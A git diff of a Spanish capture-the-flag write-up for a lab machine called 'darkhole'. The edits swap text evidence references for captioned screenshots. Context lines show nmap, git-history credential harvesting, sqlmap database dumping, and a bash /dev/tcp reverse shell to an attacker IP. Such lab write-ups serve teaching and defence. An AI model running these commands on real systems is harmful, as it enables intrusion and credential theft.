@@ -41,7 +41,7 @@ nmap -sC -sV -p- <IP-objetivo>
 ```
 
 Dos servicios y un aviso: **el script de nmap detecta un repositorio git publicado**. Ese es el
-hilo del que tira todo lo demás. (Evidencia: `evidencia/nmap.png`.)
+hilo del que tira todo lo demás. ![Escaneo: dos servicios y el aviso del repositorio .git expuesto](evidencia/nmap.png)
 
 ## Enumeración: el repositorio expuesto
 
@@ -54,7 +54,7 @@ cd backup && git log -p
 
 El historial muestra el commit que añadió el formulario de login **con credenciales por defecto
 escritas en el código**. No hay que romper nada: la llave está publicada.
-(Evidencia: `evidencia/repo.png`.)
+![El historial del repositorio: el commit con credenciales por defecto](evidencia/repo.png)
 
 ## Acceso al panel
 
@@ -71,7 +71,7 @@ sqlmap -r peticion.txt --batch --dbs
 ```
 
 sqlmap enumera la base `darkhole_2` y deja dos tablas interesantes: `users` (cuentas del sitio) y
-`ssh` (credenciales de acceso al sistema). (Evidencia: `evidencia/sqlmap.png`.)
+`ssh` (credenciales de acceso al sistema). ![Volcado con sqlmap: la base de datos y sus tablas](evidencia/sqlmap.png)
 
 ## Acceso inicial
 
@@ -80,7 +80,7 @@ ssh jehad@<IP-objetivo>
 ```
 
 La contraseña sale del volcado. Sesión en la máquina como usuario sin privilegios.
-(Evidencia: `evidencia/linpeas.png`.)
+![Enumeración con linPEAS: las pistas de su y sudo](evidencia/linpeas.png)
 
 ## Post-explotación
 
@@ -103,7 +103,11 @@ bash -i >& /dev/tcp/<IP-atacante>/<puerto> 0>&1
 ```
 
 Dentro, la flag de usuario: `cat user.txt`.
-(Evidencia: `evidencia/curl9999.png`, `evidencia/revshellgen.png`, `evidencia/revshell.png`.)
+![curl al servicio interno: el id devuelve otro usuario](evidencia/curl9999.png)
+
+![Payload de reverse shell generado contra la IP y el puerto del atacante](evidencia/revshellgen.png)
+
+![Sesión como losy y flag de usuario](evidencia/revshell.png)
 
 ## Escalada de privilegios
 
@@ -117,7 +121,9 @@ root@darkhole:/root# cat root.txt
 ```
 
 Una línea de Python y control total. Técnica: T1548.003 (Sudo) · T1059.006 (Python).
-(Evidencia: `evidencia/sudol.png`, `evidencia/flag.png`.)
+![sudo -l: la cuenta puede ejecutar Python como root](evidencia/sudol.png)
+
+![Flag de root en /root/root.txt](evidencia/flag.png)
 
 ## Detección
 
